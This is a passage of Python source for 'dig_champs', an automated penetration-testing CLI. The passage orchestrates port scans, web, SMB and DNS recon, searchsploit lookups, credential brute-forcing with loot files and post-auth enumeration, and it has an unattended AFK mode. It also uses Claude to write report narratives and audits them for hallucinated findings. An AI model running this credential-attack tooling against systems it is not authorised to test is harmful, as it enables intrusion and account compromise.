            (not old_queue or old_queue[0] != "postauth"):
        fired.append("creds→postauth")
    if has_smb_null and new_queue and new_queue[0] == "filehunt" and \
            (not old_queue or old_queue[0] != "filehunt"):
        fired.append("SMB null→filehunt")
    if has_cves and "vulnprobe" in new_queue:
        old_idx = old_queue.index("vulnprobe") if "vulnprobe" in old_queue else 99
        new_idx = new_queue.index("vulnprobe") if "vulnprobe" in new_queue else 99
        if new_idx < old_idx:
            fired.append("CVEs→vulnprobe")
    if has_juicy_web and "webfuzz" in new_queue:
        old_idx = old_queue.index("webfuzz") if "webfuzz" in old_queue else 99
        new_idx = new_queue.index("webfuzz") if "webfuzz" in new_queue else 99
        if new_idx < old_idx:
            fired.append("juicy web→webfuzz")
    if not fired and old_queue != new_queue:
        fired.append("queue-reordered")
    return fired


# ── Human narrative ───────────────────────────────────────────────────────────

_MODE_LABELS = {1: "Ghost (stealthy)", 2: "Standard", 3: "Aggressive", 4: "BOSS"}

_NARRATIVE_SYSTEM = """\
You are a professional penetration test report writer.
You will receive a structured machine trajectory log from an automated scan.
Write a formal, third-person narrative describing what was done, why, and what was found.
Tone: professional pentest report.

Rules:
- For EVERY finding you reference, embed its ID as an HTML comment: <!-- finding:XXXXXXXX -->
- Write one paragraph per completed phase: tools used, findings, severity context.
- For every queue adaptation event, write one sentence explaining why the order changed.
- Do not invent findings not present in the trajectory.
- Do not include raw command lines; describe tool purpose in plain language.
- Use third person: "The assessment identified...", "The operator observed..."
- Use Markdown headings (##) for each phase section."""


def _build_narrative_prompt(traj: dict, target: str) -> str:
    lines = [
        f"Target: {target}",
        f"Mode: {traj.get('mode')} ({_MODE_LABELS.get(traj.get('mode', 2), 'Unknown')})",
        f"Scan duration: {traj.get('total_duration_s', '?')}s",
        f"Phase execution order: "
        f"{' → '.join(traj.get('phase_order_final') or traj.get('phase_order_initial', []))}",
        "",
        "=== PHASE EVENTS ===",
    ]
    for ev in traj.get("events", []):
        if ev["event"] != "phase_end":
            continue
        fa       = ev.get("findings_added", {})
        tool_str = ", ".join(
            f"{t['tool']} ({'ok' if t['exit_ok'] else 'fail'})"
            for t in ev.get("tools", [])
        ) or "no tool recorded"
        lines.append(
            f"Phase: {ev['phase']} | Duration: {ev.get('duration_s', '?')}s"
            f" | Cached: {ev.get('cached', False)}"
            f" | Tools: {tool_str}"
            f" | Findings added: {fa.get('count', 0)}"
            f" (IDs: {', '.join(fa.get('ids', [])[:10])})"
        )
    lines += ["", "=== ADAPT DECISIONS ==="]
    for ev in traj.get("events", []):
        if ev["event"] == "adapt_rules":
            lines.append(
                f"After phase {ev['after_phase']}: queue changed "
                f"[{', '.join(ev['old_queue'])}] → [{', '.join(ev['new_queue'])}] "
                f"(rules: {', '.join(ev['rules_fired'])})"
            )
        elif ev["event"] == "adapt_claude":
            lines.append(
                f"Claude advisor: [{', '.join(ev['old_queue'])}] → "
                f"[{', '.join(ev['new_queue'])}] "
                f"(surface: {ev.get('attack_surface_summary', '')})"
            )
    return "\n".join(lines)


def _narrative_template(traj: dict, target: str) -> str:
    """Template-based fallback when Claude API is not available."""
    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    lines = [
        f"# Scan Narrative — {target}",
        f"*Generated: {ts} | Mode: {traj.get('mode')} "
        f"({_MODE_LABELS.get(traj.get('mode', 2), 'Unknown')}) | "
        f"Duration: {traj.get('total_duration_s', '?')}s*",
        "",
        "## Overview",
        f"An automated assessment was conducted against **{target}** using dig_champs "
        f"in mode {traj.get('mode')} "
        f"({_MODE_LABELS.get(traj.get('mode', 2), 'Unknown')}). "
        f"Phases executed: "
        f"{', '.join(traj.get('phase_order_final') or traj.get('phase_order_initial', []))}.",
        "",
    ]
    for ev in traj.get("events", []):
        if ev["event"] != "phase_end":
            continue
        fa          = ev.get("findings_added", {})
        ids         = fa.get("ids", [])
        n           = fa.get("count", 0)
        fid_str     = " ".join(f"<!-- finding:{i} -->" for i in ids)
        cached_note = " (loaded from session cache)" if ev.get("cached") else ""
        tool_names  = ", ".join(t["tool"] for t in ev.get("tools", [])) or "automated tooling"
        lines += [
            f"## Phase: {ev['phase'].title()} ({ev.get('duration_s', '?')}s{cached_note})",
            f"The assessment executed the **{ev['phase']}** phase against {target} "
            f"using {tool_names}. "
            f"{n} finding(s) were identified during this phase. {fid_str}",
            "",
        ]
    for ev in traj.get("events", []):
        if ev["event"] == "adapt_rules":
            lines.append(
                f"> **Queue adaptation after {ev['after_phase']}:** "
                f"Phase order adjusted — {', '.join(ev.get('rules_fired', ['reordered']))}."
            )
        elif ev["event"] == "adapt_claude":
            lines.append(
                f"> **Claude advisor:** Phase order updated based on attack surface analysis "
                f"({ev.get('attack_surface_summary', '')})."
            )
    return "\n".join(lines)


def generate_human_narrative(sdir: str, target: str, trajectory_path: str) -> str:
    """Generate trajectory_human.md. Uses Claude if API key is set, template otherwise."""
    try:
        traj = json.loads(Path(trajectory_path).read_text())
    except Exception:
        return ""

    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

    if _ANTHROPIC_KEY_PRESENT and not _OFFLINE_MODE:
        try:
            ai_client = anthropic.Anthropic()
            with console.status("[bold cyan]Generating human narrative…[/bold cyan]"):
                msg = ai_client.messages.create(
                    model="claude-opus-4-6",
                    max_tokens=4096,
                    system=_NARRATIVE_SYSTEM,
                    messages=[{"role": "user",
                               "content": _build_narrative_prompt(traj, target)}],
                )
            narrative = msg.content[0].text.strip()
        except anthropic.AuthenticationError:
            console.print(
                "[yellow][~] Narrative generation failed (auth error — check ANTHROPIC_API_KEY)"
                " — using template[/yellow]"
            )
            narrative = _narrative_template(traj, target)
        except Exception as e:
            console.print(
                f"[yellow][~] Narrative generation failed ({type(e).__name__}) — using template[/yellow]"
            )
            narrative = _narrative_template(traj, target)
    else:
        narrative = _narrative_template(traj, target)

    narr_path = Path(sdir) / "trajectory_human.md"
    narr_path.write_text(narrative, encoding="utf-8")

    home_copy = Path.home() / f"report_{target}_{ts}_narrative.md"
    try:
        home_copy.write_text(narrative, encoding="utf-8")
    except Exception:
        pass

    console.print(f"[green]✓ Human narrative → {narr_path}[/green]")
    return str(narr_path)


# ── Audit diff ────────────────────────────────────────────────────────────────

def compute_audit_diff(
    sdir: str,
    target: str,
    trajectory_path: str,
    narrative_path: str,
) -> dict:
    """Cross-reference machine trajectory against human narrative. Writes audit files."""
    try:
        traj      = json.loads(Path(trajectory_path).read_text())
        narrative = Path(narrative_path).read_text(encoding="utf-8") if narrative_path else ""
    except Exception:
        return {}

    # Pass 1 — machine finding IDs and phase timings
    machine_ids: set[str]           = set()
    phase_timings: dict[str, float] = {}
    for ev in traj.get("events", []):
        if ev["event"] == "phase_end":
            for fid in ev.get("findings_added", {}).get("ids", []):
                machine_ids.add(fid)
            if ev.get("duration_s") is not None:
                phase_timings[ev["phase"]] = float(ev["duration_s"])

    # Pass 2 — finding IDs embedded in narrative as HTML comments
    narrative_ids: set[str] = set(
        re.findall(r"<!-- finding:([0-9a-f]{8}) -->", narrative)
    )

    # Pass 3 — cross-reference
    in_machine_not_narrative = [
        {"finding_id": fid, "significance": "review-required"}
        for fid in sorted(machine_ids - narrative_ids)
    ]
    in_narrative_not_machine = [
        {"finding_id": fid}
        for fid in sorted(narrative_ids - machine_ids)
    ]

    # Pass 4 — timing anomalies
    timing_anomalies: list[dict] = []
    if len(phase_timings) >= 2:
        durations = list(phase_timings.values())
        mean_d    = statistics.mean(durations)
        stdev_d   = statistics.stdev(durations)
        threshold = mean_d + 2 * stdev_d
        for ph, dur in phase_timings.items():
            if dur > threshold:
                timing_anomalies.append({
                    "phase":      ph,
                    "duration_s": dur,
                    "mean_s":     round(mean_d, 2),
                    "stdev_s":    round(stdev_d, 2),
                })

    # Pass 5 — decision chain verification
    decision_re   = re.compile(r"(priorit|reorder|because|adapt|signal|moved|changed)", re.I)
    decision_gaps = []
    for ev in traj.get("events", []):
        if ev["event"] not in ("adapt_rules", "adapt_claude"):
            continue
        changed   = set(ev.get("old_queue", [])) ^ set(ev.get("new_queue", []))
        mentioned = False
        for phase_name in changed:
            for m in re.finditer(re.escape(phase_name), narrative, re.I):
                window = narrative[max(0, m.start() - 200): m.end() + 200]
                if decision_re.search(window):
                    mentioned = True
                    break
            if mentioned:
                break
        decision_gaps.append({
            "event_type":          ev["event"],
            "after_phase":         ev.get("after_phase", ""),
            "old_queue":           ev.get("old_queue", []),
            "new_queue":           ev.get("new_queue", []),
            "narrative_mentioned": mentioned,
        })

    audit = {
        "schema_version": "1.0",
        "generated":      datetime.utcnow().isoformat() + "Z",
        "target":         target,
        "findings_in_machine_not_narrative": in_machine_not_narrative,
        "findings_in_narrative_not_machine": in_narrative_not_machine,
        "timing_anomalies":    timing_anomalies,
        "decision_chain_gaps": decision_gaps,
        "summary": {
            "total_discrepancies":       len(in_machine_not_narrative) + len(in_narrative_not_machine),
            "unlisted_machine_findings": len(in_machine_not_narrative),
            "phantom_narrative_findings": len(in_narrative_not_machine),
            "timing_anomaly_count":      len(timing_anomalies),
            "decision_gap_count":        sum(1 for g in decision_gaps if not g["narrative_mentioned"]),
        },
    }

    (Path(sdir) / "trajectory_audit.json").write_text(
        json.dumps(audit, indent=2), encoding="utf-8"
    )

    # Markdown summary
    md = [
        f"# Trajectory Audit — {target}",
        f"*Generated: {audit['generated']}*", "",
        "## Summary",
        "| Check | Count |", "|---|---|",
        f"| Machine findings not in narrative | {len(in_machine_not_narrative)} |",
        f"| Narrative findings not in machine log | {len(in_narrative_not_machine)} |",
        f"| Timing anomalies | {len(timing_anomalies)} |",
        f"| Unexplained queue decisions | {audit['summary']['decision_gap_count']} |",
        "",
    ]
    if in_machine_not_narrative:
        md += ["## Machine Findings Not Referenced in Narrative", ""]
        for item in in_machine_not_narrative:
            md.append(f"- `{item['finding_id']}`")
        md.append("")
    if in_narrative_not_machine:
        md += ["## Narrative References Not in Machine Log",
               "These IDs have no corresponding machine event — possible hallucination.", ""]
        for item in in_narrative_not_machine:
            md.append(f"- `{item['finding_id']}`")
        md.append("")
    if timing_anomalies:
        md += ["## Timing Anomalies", ""]
        for a in timing_anomalies:
            md.append(
                f"- **{a['phase']}**: {a['duration_s']}s "
                f"(mean {a['mean_s']}s, σ {a['stdev_s']}s)"
            )
        md.append("")
    unexplained = [g for g in decision_gaps if not g["narrative_mentioned"]]
    if unexplained:
        md += ["## Unexplained Queue Decisions", ""]
        for g in unexplained:
            md.append(
                f"- After **{g['after_phase']}**: "
                f"`{g['old_queue']}` → `{g['new_queue']}` not explained in narrative"
            )
        md.append("")

    (Path(sdir) / "trajectory_audit.md").write_text("\n".join(md), encoding="utf-8")
    console.print(
        f"[green]✓ Audit diff → {Path(sdir) / 'trajectory_audit.json'}[/green]  "
        f"[dim]({audit['summary']['total_discrepancies']} discrepancies)[/dim]"
    )
    return audit


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 12 — ARGUMENT PARSER
# ══════════════════════════════════════════════════════════════════════════════
#
# Defines all CLI arguments; called once in main() before any scanning begins.
#   build_parser()    — returns configured argparse.ArgumentParser
#
# Key argument groups:
#   Target:    -t / --target (required unless --interactive)
#   Mode:      -m / --mode {1,2,3,4}  (1=Ghost/stealth → 4=BOSS/aggressive)
#   Skip flags: --no-creds, --no-filehunt, --no-webfuzz, --no-postauth,
#               --no-vulnprobe, --no-vulnreport, --no-artifacts
#               (each applies Tier 0 veto authority before the queue is built)
#   Loot:      --loot <file>  (credential list for §3 creds phase)
#   Wordlist:  --wordlist <file>  (passed directly to §7 webfuzz)
#   Output:    --out, --vuln-output
#   Safety:    --confirm-boss  (required confirmation gate for mode 4 / BOSS mode)
#   Resume:    session dir auto-detected; .done_<phase> markers control re-run

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="dig_champs",
        description="dig_champs — full-spectrum recon & post-exploitation CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
MODES
  1  Ghost   — stealth (-T1, evasion, long delays)
  2  Sneaky  — quiet  (-T2, moderate delays)
  3  YOLO    — normal (-T4)
  4  BOSS    — aggressive (-T5, requires --confirm-boss)

MODULES (all enabled by default)
  --no-creds          skip credential attacks
  --no-artifacts      skip CVE artifact analysis (requires ANTHROPIC_API_KEY)
  --no-vulnreport     skip vuln DB top-10 report
  --no-searchsploit   skip searchsploit lookup
  --no-filehunt       skip high-value file hunt
  --no-webfuzz        skip web directory/vhost fuzzing
  --no-postauth       skip post-auth enumeration after cred success
  --no-vulnprobe      skip nmap --script vuln confirmation pass

SCOPE CONTROLS
  --ports PORTS           custom nmap port spec (default: pentest-wide list)
  --exclude-ports PORTS   ports to exclude from nmap scan
  --inter-phase-delay N   seconds to sleep between scan phases (default: 0)
  --wordlist FILE         custom wordlist for web fuzzing (default: built-in)

SESSION / RESUME
  --resume PATH   resume from an existing session directory

EXAMPLES
  python3 dig_champs.py -t 10.10.10.5 -m 3
  python3 dig_champs.py -t vuln.example.com -m 2 --loot /tmp/creds.txt
  python3 dig_champs.py -t 10.0.0.1 -m 4 --confirm-boss
  python3 dig_champs.py -t 10.0.0.1 -m 3 --ports 80,443,8080-8090 --inter-phase-delay 5
  python3 dig_champs.py -t 10.0.0.1 -m 3 --wordlist /usr/share/wordlists/dirb/common.txt
  python3 dig_champs.py -t 10.0.0.1 -m 3 --resume ~/.dc_sessions/10.0.0.1_20240101_120000
  python3 dig_champs.py  (fully interactive)
""",
    )
    p.add_argument("-t", "--target",            help="Target IP address or hostname")
    p.add_argument("-m", "--mode",              type=int, choices=[1, 2, 3, 4],
                   help="Scan mode 1-4 (see MODES above)")
    p.add_argument("--loot",                    metavar="FILE",
                   help="Credential loot file (user:pass per line)")
    p.add_argument("--vuln-output",             metavar="FILE",
                   help="Save vuln report top-10 JSON to this path")
    p.add_argument("--wordlist",                metavar="FILE",
                   help="Custom wordlist for web fuzzing")
    p.add_argument("--confirm-boss",            action="store_true",
                   help="Required confirmation flag for mode 4 (BOSS)")
    p.add_argument("--no-creds",                action="store_true",
                   help="Disable credential attack module")
    p.add_argument("--no-artifacts",            action="store_true",
                   help="Disable CVE artifact analysis module")
    p.add_argument("--no-vulnreport",           action="store_true",
                   help="Disable vulnerability report module")
    p.add_argument("--no-searchsploit",         action="store_true",
                   help="Disable searchsploit lookups")
    p.add_argument("--no-filehunt",             action="store_true",
                   help="Disable high-value file hunt module")
    p.add_argument("--no-webfuzz",              action="store_true",
                   help="Disable web directory/vhost fuzzing")
    p.add_argument("--no-postauth",             action="store_true",
                   help="Disable post-auth enumeration (SSH/FTP)")
    p.add_argument("--no-vulnprobe",            action="store_true",
                   help="Disable nmap --script vuln confirmation pass")
    p.add_argument("--offline",                 action="store_true",
                   help="Disable all outbound internet calls (CVE DBs, Claude API). "
                        "Safe for air-gapped engagements. Auto-detected if no connectivity.")
    p.add_argument("--ports",                   metavar="PORTS",
                   help="Custom nmap port spec (default: pentest-wide list)")
    p.add_argument("--exclude-ports",           metavar="PORTS",
                   help="Ports to exclude from nmap scan (e.g. 22,3389)")
    p.add_argument("--inter-phase-delay",       metavar="SECS", type=int, default=0,
                   help="Seconds to sleep between scan phases")
    p.add_argument("--resume",                  metavar="PATH",
                   help="Resume from an existing session directory")
    return p


# ══════════════════════════════════════════════════════════════════════════════
# SECTION 9 — MAIN ORCHESTRATOR
# (labelled 9 for legacy reasons; functions as Section 14 in the actual sequence)
# ══════════════════════════════════════════════════════════════════════════════
#
# Top-level scan orchestration. Runs all phases in order, manages the dynamic queue.
#
# Fixed phase sequence (always runs in this order, before the dynamic queue):
#   1. nmap (§2)             — port scan; nmap_output string used by all later phases
#   2. static recon (§2)     — nikto, whatweb, enum4linux, dnsrecon (mode-dependent)
#   3. searchsploit (§2)     — CVE lookup against detected software (optional tool)
#   4. creds (§3)            — credential attacks; output populates cred_results
#
# Queue build (between fixed and dynamic phases):
#   - Builds phase_queue from enabled --no-X flags  (Tier 0 / operator veto)
#   - Calls claude_strategic_advisor() once if API key present  (Tier 1)
#   - recorder.scan_start() called here once queue is finalised
#
# Dynamic loop: while _queue_idx < len(phase_queue)
#   - _executed set guards against any phase running twice
#   - live_adapt_rules() called after every phase  (Tier 2 — can extend phase_queue)
#   - vulnreport_top10 and fuzz_findings are initialised before the loop so that
#     later phases (artifacts, postauth) can reference earlier phase outputs
#
# Post-loop (Tier 3 — no feedback to scan):
#   - recorder.scan_end()
#   - save_report()              → report_<target>_<ts>.json + .md
#   - print_final_summary()
#   - generate_human_narrative() → trajectory_human.md
#   - compute_audit_diff()       → trajectory_audit.json + .md

BANNER = """
[bold red]
  ██████╗ ██╗ ██████╗      ██████╗██╗  ██╗ █████╗ ███╗   ███╗██████╗ ███████╗
  ██╔══██╗██║██╔════╝     ██╔════╝██║  ██║██╔══██╗████╗ ████║██╔══██╗██╔════╝
  ██║  ██║██║██║  ███╗    ██║     ███████║███████║██╔████╔██║██████╔╝███████╗
  ██║  ██║██║██║   ██║    ██║     ██╔══██║██╔══██║██║╚██╔╝██║██╔═══╝ ╚════██║
  ██████╔╝██║╚██████╔╝    ╚██████╗██║  ██║██║  ██║██║ ╚═╝ ██║██║     ███████║
  ╚═════╝ ╚═╝ ╚═════╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝
[/bold red]
[dim]  Full recon + credential attacks + CVE artifacts + vuln ranking + file hunt[/dim]
"""


def _timed_input(prompt: str, default: str = "", timeout: int | None = None) -> str:
    """
    Like input(), but with two AFK-aware behaviours:

    - If _AFK_MODE is True, returns `default` immediately (no I/O).
    - Otherwise, waits up to `timeout` seconds (default: _PROMPT_TIMEOUT) for
      the user to type something.  If the clock runs out, prints a notice and
      returns `default`.

    Uses a daemon thread so a timed-out prompt never blocks the process on
    Windows (where select() does not work on stdin).
    """
    global _AFK_MODE
    if _AFK_MODE:
        return default

    _t = timeout if timeout is not None else _PROMPT_TIMEOUT
    full_prompt = f"{prompt} (auto-default in {_t}s): "

    result: list[str] = [default]

    def _read() -> None:
        try:
            result[0] = input(full_prompt)
        except EOFError:
            pass

    thread = threading.Thread(target=_read, daemon=True)
    thread.start()
    thread.join(_t)

    if thread.is_alive():
        console.print(
            f"\n[dim][~] No input after {_t}s — using default: "
            f"{'(empty)' if default == '' else repr(default)}[/dim]"
        )

    return result[0]


def interactive_prompt(args: argparse.Namespace) -> argparse.Namespace:
    """
    Fill any missing required args interactively.
    Respects flags already set via CLI — never re-prompts for them.
    All prompts time out after _PROMPT_TIMEOUT seconds and accept their default.
    """
    global _AFK_MODE
    console.print(BANNER)

    # ── AFK mode selection — shown first, short fuse ──────────────────────
    afk_ans = _timed_input(
        "\nRun in AFK mode? All prompts use defaults and the scan runs unattended (y/n) [n]",
        default="n",
        timeout=10,
    )
    _AFK_MODE = afk_ans.strip().lower() == "y"
    if _AFK_MODE:
        console.print(
            "[bold cyan][~] AFK mode active — all prompts will auto-accept defaults[/bold cyan]"
        )

    if not args.target:
        raw = _timed_input("Target IP/domain", default="").strip()
        if not raw:
            console.print("[red][!] No target provided and none set via CLI.[/red]")
            sys.exit(1)
        args.target = raw

    if not args.mode:
        console.print("\n[bold]1=Ghost  2=Sneaky  3=YOLO  4=BOSS[/bold]")
        try:
            args.mode = int(_timed_input("Mode [1-4]", default="2").strip())
        except ValueError:
            console.print("[red][!] Invalid mode — defaulting to 2 (Sneaky)[/red]")
            args.mode = 2

    if args.mode not in range(1, 5):
        console.print("[red][!] Mode must be 1–4[/red]")
        sys.exit(1)

    if args.mode == 4 and not args.confirm_boss:
        # AFK cannot confirm BOSS — downgrade rather than hang
        if _AFK_MODE:
            console.print(
                "[yellow][~] AFK mode cannot confirm BOSS. Downgrading to mode 3.[/yellow]"
            )
            args.mode = 3
        else:
            confirm = _timed_input("Type CONFIRM to use BOSS mode", default="")
            if confirm != "CONFIRM":
                console.print("[yellow]Cancelled.[/yellow]")
                sys.exit(0)
            args.confirm_boss = True

    # Only prompt for module toggles that haven't been pre-set via CLI flags
    if not args.no_creds:
        ans = _timed_input("\nRun credential attack? (y/n)", default="y").strip().lower()
        args.no_creds = (ans == "n")
        if not args.no_creds and not args.loot:
            loot = _timed_input("Loot file for credential stuffing (blank to skip)", default="").strip()
            if loot:
                args.loot = loot

    if not args.no_searchsploit:
        ans = _timed_input("Run searchsploit on findings? (y/n)", default="y").strip().lower()
        args.no_searchsploit = (ans == "n")

    if not args.no_vulnreport:
        ans = _timed_input("Run vuln DB report? (y/n)", default="y").strip().lower()
        args.no_vulnreport = (ans == "n")

    if not args.no_artifacts:
        if not _ANTHROPIC_KEY_PRESENT:
            console.print(
                "[yellow][~] ANTHROPIC_API_KEY not set — "
                "CVE artifact analysis will be skipped[/yellow]"
            )
            args.no_artifacts = True
        else:
            ans = _timed_input("Run CVE artifact analysis via Claude? (y/n)", default="y").strip().lower()
            args.no_artifacts = (ans == "n")

    if not args.no_filehunt:
        ans = _timed_input("Run high-value file hunt? (y/n)", default="y").strip().lower()
        args.no_filehunt = (ans == "n")

    if not args.no_webfuzz:
        ans = _timed_input("Run web directory/vhost fuzzing? (y/n)", default="y").strip().lower()
        args.no_webfuzz = (ans == "n")
        if not args.no_webfuzz and not args.wordlist:
            wl = _timed_input("Wordlist path for fuzzing (blank for built-in)", default="").strip()
            if wl:
                args.wordlist = wl

    if not args.no_postauth:
        ans = _timed_input("Run post-auth enumeration (SSH/FTP)? (y/n)", default="y").strip().lower()
        args.no_postauth = (ans == "n")

    if not args.no_vulnprobe:
        ans = _timed_input("Run nmap vuln probe pass? (y/n)", default="y").strip().lower()
        args.no_vulnprobe = (ans == "n")

    return args


def _phase_sleep(delay: int, label: str):
    if delay > 0:
        console.print(f"[dim][~] Inter-phase delay: sleeping {delay}s before {label}…[/dim]")
        time.sleep(delay)


def main():
    parser = build_parser()
    args   = parser.parse_args()

    # ── Offline mode: explicit flag or auto-detect ────────────────────────
    global _OFFLINE_MODE
    if args.offline:
        _OFFLINE_MODE = True
        console.print(
            "[yellow][~] Offline mode active — CVE lookups and Claude features skipped.[/yellow]"
        )
    elif not _detect_internet():
        _OFFLINE_MODE = True
        console.print(
            "[yellow][~] No internet detected — switching to offline mode automatically. "
            "CVE lookups and Claude features will be skipped.[/yellow]"
        )

    # ── API key check before anything else ───────────────────────────────
    if not _ANTHROPIC_KEY_PRESENT and not args.no_artifacts:
        console.print(
            "[yellow][~] ANTHROPIC_API_KEY not set — "
            "CVE artifact analysis auto-disabled. "
            "Set the env var to enable it.[/yellow]"
        )
        args.no_artifacts = True

    # ── Interactive fill-in if required args are missing ─────────────────
    needs_interactive = not args.target or not args.mode
    if needs_interactive:
        args = interactive_prompt(args)
    else:
        if args.mode == 4 and not args.confirm_boss:
            console.print("[red][!] Mode 4 (BOSS) requires --confirm-boss flag.[/red]")
            sys.exit(1)

    # ── Validate target ───────────────────────────────────────────────────
    target = ok(args.target)
    if not target:
        console.print("[red][!] Invalid or unresolvable target.[/red]")
        sys.exit(1)

    # ── Check required tools ──────────────────────────────────────────────
    for t in ["nmap", "nikto", "enum4linux", "whatweb", "dnsrecon"]:
        need(t)
    if not args.no_searchsploit and not avail("searchsploit"):
        console.print("[yellow][~] searchsploit not found — disabling[/yellow]")
        args.no_searchsploit = True

    # ── Build port spec ───────────────────────────────────────────────────
    port_spec = args.ports or PENTEST_PORTS
    if args.exclude_ports:
        port_spec = f"{port_spec} --exclude-ports {args.exclude_ports}"

    delay = getattr(args, "inter_phase_delay", 0) or 0

    # ── Session directory (persistent, resumable) ─────────────────────────
    sdir = session_dir(target, getattr(args, "resume", None))

    # The engine persists for the lifetime of this scan and is passed to
    # deliberate(), plan(), perceive(), and learn() at the sites below.

    # Persist args so --resume can show what flags were used
    save_session_meta(sdir, {
        "target": target,
        "mode": args.mode,
        "no_creds": args.no_creds,
        "no_artifacts": args.no_artifacts,
        "no_vulnreport": args.no_vulnreport,
        "no_searchsploit": args.no_searchsploit,
        "no_filehunt": args.no_filehunt,
        "no_webfuzz": getattr(args, "no_webfuzz", False),
        "no_postauth": getattr(args, "no_postauth", False),
        "no_vulnprobe": getattr(args, "no_vulnprobe", False),
        "ports": getattr(args, "ports", None),
        "exclude_ports": getattr(args, "exclude_ports", None),
        "wordlist": getattr(args, "wordlist", None),
    })

    console.print(
        f"\n[bold green][+] Starting scan: [cyan]{target}[/cyan]  "
        f"mode=[cyan]{args.mode}[/cyan]  "
        f"session=[dim]{sdir}[/dim][/bold green]\n"
    )

    findings:     list[dict] = []
    cred_results: list[dict] = []

    recorder = TrajectoryRecorder(sdir, target, args.mode)

    # ══════════════════════════════════════════════════════════════════════
    # PHASE 1 — NMAP
    # ══════════════════════════════════════════════════════════════════════
    recorder.phase_start("nmap")
    _t0 = time.monotonic()
    if phase_done(sdir, "nmap"):
        console.print("[dim][~] nmap phase already complete — loading cached output[/dim]")
        nmap        = load_phase(sdir, "nmap.txt")
        _nmap_cached = True
    else:
        console.print("[bold][+] Nmap…[/bold]")
        nmap        = nmap_scan(target, args.mode, sdir, port_spec)
        _nmap_cached = False
        mark_done(sdir, "nmap")
    recorder.record_tool("nmap", "nmap", exit_ok=bool(nmap.strip()), duration_s=time.monotonic()-_t0)
    recorder.phase_end("nmap", [], cached=_nmap_cached)

    http = any(s in nmap for s in ["http", "https", "nginx", "apache", "iis"])
    smb  = any(s in nmap for s in ["microsoft-ds", "netbios", "445", "139"])

    # ══════════════════════════════════════════════════════════════════════
    # PHASE 2 — WEB / SMB / DNS RECON
    # ══════════════════════════════════════════════════════════════════════
    recorder.phase_start("recon")
    _phase_sleep(delay, "web/smb/dns recon")

    _t0 = time.monotonic()
    if phase_done(sdir, "nikto"):
        nikto = load_phase(sdir, "nikto.txt")
    else:
        nikto = nikto_scan(target, args.mode, sdir) if http else (
            console.print("[dim][~] No HTTP, skipping Nikto[/dim]") or "")
        mark_done(sdir, "nikto")
    recorder.record_tool("recon", "nikto", exit_ok=bool(nikto), duration_s=time.monotonic()-_t0)

    _t0 = time.monotonic()
    if phase_done(sdir, "whatweb"):
        whatweb = load_phase(sdir, "whatweb.txt")
    else:
        whatweb = whatweb_scan(target, sdir) if http else (
            console.print("[dim][~] No HTTP, skipping WhatWeb[/dim]") or "")
        mark_done(sdir, "whatweb")
    recorder.record_tool("recon", "whatweb", exit_ok=bool(whatweb), duration_s=time.monotonic()-_t0)

    _t0 = time.monotonic()
    if phase_done(sdir, "enum4linux"):
        enum4 = load_phase(sdir, "enum.txt")
    else:
        enum4 = enum_scan(target, sdir) if smb else (
            console.print("[dim][~] No SMB, skipping enum4linux[/dim]") or "")
        mark_done(sdir, "enum4linux")
    recorder.record_tool("recon", "enum4linux", exit_ok=bool(enum4), duration_s=time.monotonic()-_t0)

    _t0 = time.monotonic()
    if phase_done(sdir, "dnsrecon"):
        dns = load_phase(sdir, "dnsrecon.txt")
    else:
        _phase_sleep(delay, "dnsrecon")
        dns = dnsrecon_scan(target, sdir)
        mark_done(sdir, "dnsrecon")
    recorder.record_tool("recon", "dnsrecon", exit_ok=bool(dns), duration_s=time.monotonic()-_t0)

    findings = parse_recon(nmap, nikto or "", enum4 or "", whatweb or "", dns)
    recorder.phase_end("recon", findings)

    # ══════════════════════════════════════════════════════════════════════
    # PHASE 3 — SEARCHSPLOIT
    # ══════════════════════════════════════════════════════════════════════
    if not args.no_searchsploit:
        _phase_sleep(delay, "searchsploit")
        _snap = len(findings)
        recorder.phase_start("searchsploit")
        run_searchsploit(findings)
        recorder.phase_end("searchsploit", findings[_snap:])

    # ══════════════════════════════════════════════════════════════════════
    # PHASE 4 — CREDENTIAL ATTACKS
    # ══════════════════════════════════════════════════════════════════════
    if not args.no_creds:
        recorder.phase_start("creds")
        _t0 = time.monotonic()
        if not phase_done(sdir, "creds"):
            _phase_sleep(delay, "credential attacks")
            cred_results = run_creds(
                target, args.mode, nmap, getattr(args, "loot", None)
            )
            _cred_path = Path(sdir) / "cred_results.json"
            _cred_path.write_text(json.dumps(cred_results, indent=2))
            _cred_path.chmod(0o600)
            mark_done(sdir, "creds")
            _creds_cached = False
        else:
            console.print("[dim][~] creds phase already complete — loading cached results[/dim]")
            try:
                cred_results = json.loads(
                    (Path(sdir) / "cred_results.json").read_text()
                )
            except Exception:
                cred_results = []
            _creds_cached = True
        recorder.record_tool("creds", "hydra/cme", exit_ok=bool(cred_results),
                              duration_s=time.monotonic()-_t0)

        _snap = len(findings)
        for c in cred_results:
            findings.append({
                "cred":    f"{c['user']}:{c['password']}",
                "service": c["service"],
                "port":    str(c["port"]),
                "src":     "dc_creds",
            })
        recorder.phase_end("creds", findings[_snap:], cached=_creds_cached)

    # ══════════════════════════════════════════════════════════════════════
    # BUILD DYNAMIC PHASE QUEUE  (post-creds phases, live-adapted)
    # Tier 0: wan_si_tong Path Designer pre-orders the queue based on
    # methodology scoring + historical outcomes before Tier 1 (Claude advisor).
    # ══════════════════════════════════════════════════════════════════════

    # Operator-enabled phases (respects --no-X flags)
    _operator_queue: list[str] = []
    if not args.no_filehunt:                        _operator_queue.append("filehunt")
    if not getattr(args, "no_webfuzz",   False):    _operator_queue.append("webfuzz")
    if not getattr(args, "no_postauth",  False):    _operator_queue.append("postauth")
    if not getattr(args, "no_vulnprobe", False):    _operator_queue.append("vulnprobe")
    if not args.no_vulnreport:                      _operator_queue.append("vulnreport")
    if not args.no_artifacts:                       _operator_queue.append("artifacts")

    # ── Tier 0: Path Designer ─────────────────────────────────────────────
    if _WST_AVAILABLE and _operator_queue:
        try:
            _wst_router    = _WstRouter()
            _detected_os   = _wst_router.detect_os(findings)
            _wst_tracker   = _WstTracker()
            _wst_suggs     = _wst_collate(
                findings, cred_results,
                os_tag=_detected_os.os_tag if _detected_os.os_tag != "unknown" else None,
                tracker=_wst_tracker,
